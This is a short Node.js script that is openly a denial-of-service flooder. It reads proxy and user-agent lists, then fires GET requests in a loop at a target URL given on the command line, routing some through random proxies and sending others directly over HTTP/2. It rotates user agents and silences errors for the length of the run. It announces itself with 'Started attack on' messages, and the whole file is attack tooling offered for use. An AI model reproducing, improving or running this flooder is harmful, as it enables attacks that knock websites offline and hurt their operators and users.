const http2 = require('http2');
const http = require('http');
const crypto = require('crypto');
const fs = require('fs');
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateHeaders() {
    return {
        'User-Agent': getRandomElement(userAgents),
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
    };
}

function sendRequest(url, proxy) {
    const proxyHost = proxy.split(':')[0];
    const proxyPort = proxy.split(':')[1];
    if (Math.random() > 0.5) {
        const options = {
            hostname: proxyHost,
            port: proxyPort,
            path: url,
            method: 'GET',
            headers: generateHeaders(),
        };

        const req = http.request(options);
        req.on('error', () => {});
        req.end();
    } else {
        const client = http2.connect(url);
        const req = client.request(generateHeaders());
        req.on('error', () => {});
        req.end();
        client.close();
    }

    crypto.createHash('sha256').update(url).digest('hex');
}

async function main(url, duration) {
    console.log(`Started attack on ${url} for ${duration} seconds...`);
    const endTime = Date.now() + duration * 1000;

    while (Date.now() < endTime) {
        const proxy = getRandomElement(proxies);
        sendRequest(url, proxy);
    }

    console.log(`Finished attack on ${url}!`);
}

if (process.argv.length !== 4) {
    console.log('Usage: node z.js <url> <time>');
    process.exit(1);
}

const url = process.argv[2];
const duration = parseInt(process.argv[3]);
main(url, duration);
